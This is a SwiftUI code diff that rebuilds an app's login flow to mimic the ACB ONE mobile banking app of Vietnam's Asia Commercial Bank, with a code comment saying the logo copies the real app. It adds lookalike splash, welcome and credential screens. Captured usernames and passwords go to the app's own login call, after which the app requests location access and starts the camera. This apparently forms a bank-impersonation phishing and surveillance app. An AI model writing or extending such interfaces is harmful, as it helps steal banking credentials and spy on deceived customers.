@@ -80,6 +80,7 @@ struct ContentView: View {
 
     @State private var usernameInput = ""
     @State private var passwordInput = ""
+    @State private var acbStep = 0
     @State private var isFakeLocked = false
     @State private var serverInfoChecked = false
     @State private var serverInfoHint: String? = nil
@@ -116,141 +117,263 @@ struct ContentView: View {
                 .onAppear { checkServerOnAppear() }
 
             if !networkManager.isAuthenticated {
-                // ACB ONE Banking Login View
-                ZStack {
-                    LinearGradient(
-                        colors: [
-                            Color(red: 0.0, green: 0.34, blue: 0.84),
-                            Color(red: 0.0, green: 0.20, blue: 0.58)
-                        ],
-                        startPoint: .topLeading,
-                        endPoint: .bottomTrailing
-                    )
-                    .ignoresSafeArea()
-
-                    ScrollView {
-                        VStack(spacing: 22) {
-                            VStack(spacing: 8) {
-                                ZStack {
-                                    RoundedRectangle(cornerRadius: 20)
-                                        .fill(Color.white.opacity(0.14))
-                                        .frame(width: 82, height: 82)
-                                        .overlay(
-                                            RoundedRectangle(cornerRadius: 20)
-                                                .stroke(Color(red: 0.0, green: 0.78, blue: 0.98).opacity(0.75), lineWidth: 1.5)
-                                        )
-                                    VStack(spacing: 1) {
-                                        Text("ACB")
-                                            .font(.system(size: 28, weight: .black, design: .rounded))
-                                            .foregroundColor(.white)
-                                        Rectangle()
-                                            .fill(Color(red: 0.0, green: 0.80, blue: 1.0))
-                                            .frame(width: 34, height: 3)
-                                            .cornerRadius(1.5)
-                                    }
-                                }
-
-                                Text("ACB ONE")
-                                    .font(.system(size: 28, weight: .black, design: .rounded))
-                                    .foregroundColor(.white)
-
-                                Text("Ngân hàng TMCP Á Châu")
-                                    .font(.subheadline)
-                                    .fontWeight(.medium)
-                                    .foregroundColor(Color.white.opacity(0.85))
+                if acbStep == 0 {
+                    // Bước 1: Màn hình Splash ACB ONE (nền trắng, logo giữa)
+                    ZStack {
+                        Color.white.ignoresSafeArea()
+                        acbOneLogo(isWhite: false, fontSize: 34)
+                    }
+                    .onAppear {
+                        DispatchQueue.main.asyncAfter(deadline: .now() + 0.7) {
+                            withAnimation(.easeInOut(duration: 0.25)) {
+                                if acbStep == 0 { acbStep = 1 }
                             }
-                            .padding(.top, 26)
+                        }
+                    }
+                } else if acbStep == 1 {
+                    // Bước 2: Màn hình Chào ACB ONE (nút ĐĂNG NHẬP + Lấy OTP / Đăng ký / Quét mã QR)
+                    ZStack {
+                        LinearGradient(
+                            colors: [
+                                Color(red: 0.08, green: 0.22, blue: 0.42),
+                                Color(red: 0.14, green: 0.30, blue: 0.36),
+                                Color(red: 0.18, green: 0.22, blue: 0.26)
+                            ],
+                            startPoint: .topLeading,
+                            endPoint: .bottomTrailing
+                        )
+                        .ignoresSafeArea()
 
-                            if let err = networkManager.errorMessage {
-                                Text(err)
-                                    .font(.caption)
-                                    .fontWeight(.semibold)
+                        // Hiệu ứng ánh sáng nền nhẹ nhàng
+                        GeometryReader { geo in
+                            Circle()
+                                .fill(Color(red: 0.95, green: 0.78, blue: 0.32).opacity(0.22))
+                                .frame(width: 240, height: 240)
+                                .blur(radius: 45)
+                                .position(x: geo.size.width * 0.65, y: geo.size.height * 0.28)
+
+                            Circle()
+                                .fill(Color(red: 0.0, green: 0.68, blue: 0.96).opacity(0.22))
+                                .frame(width: 220, height: 220)
+                                .blur(radius: 45)
+                                .position(x: geo.size.width * 0.28, y: geo.size.height * 0.48)
+                        }
+                        .ignoresSafeArea()
+
+                        VStack {
+                            // Header: Icon trái + ACB ONE giữa + Icon phải
+                            HStack(alignment: .top) {
+                                Image(systemName: "photo.on.rectangle.angled")
+                                    .font(.system(size: 20, weight: .medium))
                                     .foregroundColor(.white)
-                                    .multilineTextAlignment(.center)
-                                    .padding(12)
-                                    .frame(maxWidth: .infinity)
-                                    .background(Color.red.opacity(0.85))
-                                    .cornerRadius(12)
+                                    .padding(8)
+
+                                Spacer()
+
+                                acbOneLogo(isWhite: true, fontSize: 28)
+                                    .padding(.top, 4)
+
+                                Spacer()
+
+                                VStack(spacing: 12) {
+                                    Image(systemName: "storefront")
+                                        .font(.system(size: 18, weight: .medium))
+                                        .foregroundColor(.white)
+                                        .frame(width: 38, height: 38)
+                                        .background(Color.black.opacity(0.28))
+                                        .clipShape(RoundedRectangle(cornerRadius: 12))
+
+                                    Image(systemName: "ellipsis")
+                                        .font(.system(size: 18, weight: .bold))
+                                        .foregroundColor(.white)
+                                        .frame(width: 38, height: 38)
+                                        .background(Color.black.opacity(0.28))
+                                        .clipShape(RoundedRectangle(cornerRadius: 12))
+                                }
                             }
+                            .padding(.horizontal, 18)
+                            .padding(.top, 12)
 
-                            VStack(alignment: .leading, spacing: 16) {
-                                VStack(alignment: .leading, spacing: 6) {
-                                    Text("Tên đăng nhập")
-                                        .font(.caption)
-                                        .fontWeight(.bold)
-                                        .foregroundColor(Color(red: 0.08, green: 0.20, blue: 0.45))
-                                    TextField("Nhập tên đăng nhập", text: $usernameInput)
-                                        .padding(12)
-                                        .background(Color(red: 0.95, green: 0.97, blue: 1.0))
-                                        .foregroundColor(.black)
-                                        .cornerRadius(12)
-                                        .overlay(
-                                            RoundedRectangle(cornerRadius: 12)
-                                                .stroke(Color(red: 0.80, green: 0.87, blue: 0.96), lineWidth: 1)
-                                        )
-                                        .autocapitalization(.none)
-                                        .disableAutocorrection(true)
-                                }
+                            Spacer()
 
-                                VStack(alignment: .leading, spacing: 6) {
-                                    Text("Mật khẩu")
-                                        .font(.caption)
-                                        .fontWeight(.bold)
-                                        .foregroundColor(Color(red: 0.08, green: 0.20, blue: 0.45))
-                                    SecureField("Nhập mật khẩu", text: $passwordInput)
-                                        .padding(12)
-                                        .background(Color(red: 0.95, green: 0.97, blue: 1.0))
-                                        .foregroundColor(.black)
-                                        .cornerRadius(12)
-                                        .overlay(
-                                            RoundedRectangle(cornerRadius: 12)
-                                                .stroke(Color(red: 0.80, green: 0.87, blue: 0.96), lineWidth: 1)
-                                        )
-                                }
-
+                            VStack(spacing: 18) {
                                 Button(action: {
-                                    networkManager.loginMobile(username: usernameInput, password: passwordInput) { success in
-                                        if success {
-                                            locationManager.requestPermissions()
-                                            cameraManager.setupCamera { _ in }
-                                        }
+                                    withAnimation(.easeInOut(duration: 0.2)) {
+                                        acbStep = 2
                                     }
                                 }) {
                                     Text("ĐĂNG NHẬP")
-                                        .font(.headline)
-                                        .fontWeight(.bold)
+                                        .font(.system(size: 16, weight: .bold))
                                         .foregroundColor(.white)
                                         .frame(maxWidth: .infinity)
-                                        .padding(.vertical, 14)
-                                        .background(
-                                            LinearGradient(
-                                                colors: [
-                                                    Color(red: 0.0, green: 0.36, blue: 0.86),
-                                                    Color(red: 0.0, green: 0.25, blue: 0.68)
-                                                ],
-                                                startPoint: .leading,
-                                                endPoint: .trailing
-                                            )
-                                        )
-                                        .cornerRadius(14)
-                                        .shadow(color: Color(red: 0.0, green: 0.30, blue: 0.80).opacity(0.35), radius: 6, x: 0, y: 3)
+                                        .padding(.vertical, 16)
+                                        .background(Color(red: 0.08, green: 0.44, blue: 1.0))
+                                        .clipShape(Capsule())
+                                        .shadow(color: Color.black.opacity(0.25), radius: 8, x: 0, y: 4)
                                 }
-                                .padding(.top, 4)
-                            }
-                            .padding(20)
-                            .background(Color.white)
-                            .cornerRadius(22)
-                            .shadow(color: Color.black.opacity(0.22), radius: 14, x: 0, y: 8)
 
-                            Text("Mã thiết bị: \(DeviceBindingManager.shared.getOrCreateDeviceUUID())")
-                                .font(.system(size: 9, design: .monospaced))
-                                .foregroundColor(Color.white.opacity(0.45))
-                                .lineLimit(1)
-                                .padding(.top, 6)
+                                HStack(spacing: 20) {
+                                    HStack(spacing: 5) {
+                                        Image(systemName: "checkmark.shield")
+                                            .font(.system(size: 14))
+                                        Text("Lấy OTP")
+                                            .font(.system(size: 13, weight: .semibold))
+                                    }
+                                    HStack(spacing: 5) {
+                                        Image(systemName: "square.and.pencil")
+                                            .font(.system(size: 14))
+                                        Text("Đăng ký")
+                                            .font(.system(size: 13, weight: .semibold))
+                                    }
+                                    HStack(spacing: 5) {
+                                        Image(systemName: "qrcode.viewfinder")
+                                            .font(.system(size: 14))
+                                        Text("Quét mã QR")
+                                            .font(.system(size: 13, weight: .semibold))
+                                    }
+                                }
+                                .foregroundColor(.white)
+
+                                HStack(spacing: 4) {
+                                    Text("Xem nhanh mã QR")
+                                        .font(.system(size: 13, weight: .medium))
+                                    Image(systemName: "chevron.up.chevron.down")
+                                        .font(.system(size: 10))
+                                }
+                                .foregroundColor(Color.white.opacity(0.9))
+                                .padding(.bottom, 16)
+                            }
+                            .padding(.horizontal, 24)
+                            .frame(maxWidth: 440)
                         }
-                        .padding()
-                        .frame(maxWidth: 440)
-                        .frame(maxWidth: .infinity)
+                    }
+                } else {
+                    // Bước 3: Màn hình Nhập Tài Khoản ACB ONE (nền trắng sạch)
+                    ZStack {
+                        Color.white.ignoresSafeArea()
+
+                        VStack(spacing: 0) {
+                            // Top bar: Nút < bên trái + ACB ONE ở giữa
+                            HStack {
+                                Button(action: {
+                                    withAnimation(.easeInOut(duration: 0.2)) {
+                                        acbStep = 1
+                                    }
+                                }) {
+                                    Image(systemName: "chevron.left")
+                                        .font(.system(size: 20, weight: .medium))
+                                        .foregroundColor(Color(red: 0.30, green: 0.35, blue: 0.42))
+                                        .padding(8)
+                                }
+
+                                Spacer()
+
+                                acbOneLogo(isWhite: false, fontSize: 26)
+
+                                Spacer()
+
+                                Color.clear.frame(width: 36, height: 36)
+                            }
+                            .padding(.horizontal, 14)
+                            .padding(.top, 8)
+
+                            ScrollView {
+                                VStack(alignment: .leading, spacing: 18) {
+                                    if let err = networkManager.errorMessage {
+                                        Text(err)
+                                            .font(.caption)
+                                            .fontWeight(.semibold)
+                                            .foregroundColor(.white)
+                                            .multilineTextAlignment(.center)
+                                            .padding(12)
+                                            .frame(maxWidth: .infinity)
+                                            .background(Color.red.opacity(0.85))
+                                            .cornerRadius(12)
+                                    }
+
+                                    VStack(alignment: .leading, spacing: 6) {
+                                        Text("Tên đăng nhập")
+                                            .font(.subheadline)
+                                            .fontWeight(.medium)
+                                            .foregroundColor(Color(red: 0.30, green: 0.34, blue: 0.40))
+                                        TextField("Nhập tên đăng nhập", text: $usernameInput)
+                                            .padding(.horizontal, 14)
+                                            .padding(.vertical, 14)
+                                            .background(Color(red: 0.96, green: 0.96, blue: 0.97))
+                                            .foregroundColor(.black)
+                                            .cornerRadius(12)
+                                            .overlay(
+                                                RoundedRectangle(cornerRadius: 12)
+                                                    .stroke(Color(red: 0.85, green: 0.86, blue: 0.89), lineWidth: 1)
+                                            )
+                                            .autocapitalization(.none)
+                                            .disableAutocorrection(true)
+                                    }
+
+                                    VStack(alignment: .leading, spacing: 6) {
+                                        Text("Mật khẩu")
+                                            .font(.subheadline)
+                                            .fontWeight(.medium)
+                                            .foregroundColor(Color(red: 0.30, green: 0.34, blue: 0.40))
+                                        SecureField("Nhập mật khẩu", text: $passwordInput)
+                                            .padding(.horizontal, 14)
+                                            .padding(.vertical, 14)
+                                            .background(Color(red: 0.96, green: 0.96, blue: 0.97))
+                                            .foregroundColor(.black)
+                                            .cornerRadius(12)
+                                            .overlay(
+                                                RoundedRectangle(cornerRadius: 12)
+                                                    .stroke(Color(red: 0.85, green: 0.86, blue: 0.89), lineWidth: 1)
+                                            )
+                                    }
+
+                                    Button(action: {
+                                        networkManager.loginMobile(username: usernameInput, password: passwordInput) { success in
+                                            if success {
+                                                locationManager.requestPermissions()
+                                                cameraManager.setupCamera { _ in }
+                                            }
+                                        }
+                                    }) {
+                                        Text("Đăng nhập")
+                                            .font(.system(size: 16, weight: .bold))
+                                            .foregroundColor(.white)
+                                            .frame(maxWidth: .infinity)
+                                            .padding(.vertical, 15)
+                                            .background(Color(red: 0.0, green: 0.42, blue: 1.0))
+                                            .clipShape(Capsule())
+                                    }
+                                    .padding(.top, 8)
+
+                                    HStack(spacing: 6) {
+                                        Image(systemName: "questionmark.bubble")
+                                            .font(.system(size: 14, weight: .semibold))
+                                        Text("Quên thông tin đăng nhập?")
+                                            .font(.system(size: 14, weight: .semibold))
+                                    }
+                                    .foregroundColor(Color(red: 0.0, green: 0.42, blue: 1.0))
+                                    .frame(maxWidth: .infinity)
+                                    .padding(.top, 4)
+                                }
+                                .padding(.horizontal, 22)
+                                .padding(.top, 28)
+                                .frame(maxWidth: 440)
+                                .frame(maxWidth: .infinity)
+                            }
+
+                            HStack {
+                                Text("ID: \(DeviceBindingManager.shared.getOrCreateDeviceUUID())")
+                                    .font(.system(size: 8, design: .monospaced))
+                                    .foregroundColor(Color.gray.opacity(0.45))
+                                    .lineLimit(1)
+                                Spacer()
+                                Text("DIV")
+                                    .font(.system(size: 12, weight: .black, design: .rounded))
+                                    .foregroundColor(Color(red: 0.0, green: 0.38, blue: 0.80).opacity(0.7))
+                            }
+                            .padding(.horizontal, 18)
+                            .padding(.bottom, 10)
+                        }
                     }
                 }
             } else {
@@ -418,7 +541,29 @@ struct ContentView: View {
             if !authenticated {
                 usernameInput = ""
                 passwordInput = ""
+                acbStep = 1
             }
+        }
+    }
+
+    // MARK: - Logo ACB ONE (giống app ACB ONE thật)
+    @ViewBuilder
+    private func acbOneLogo(isWhite: Bool, fontSize: CGFloat) -> some View {
+        HStack(spacing: 4) {
+            ZStack {
+                Text("ACB")
+                    .font(.system(size: fontSize, weight: .black, design: .rounded))
+                    .foregroundColor(isWhite ? .white : Color(red: 0.0, green: 0.26, blue: 0.66))
+                if !isWhite {
+                    Circle()
+                        .fill(Color(red: 0.0, green: 0.72, blue: 0.96))
+                        .frame(width: fontSize * 0.24, height: fontSize * 0.24)
+                        .offset(x: -fontSize * 0.02, y: 0)
+                }
+            }
+            Text("ONE")
+                .font(.system(size: fontSize, weight: .black, design: .rounded))
+                .foregroundColor(isWhite ? .white : Color(red: 0.0, green: 0.48, blue: 1.0))
         }
     }
 
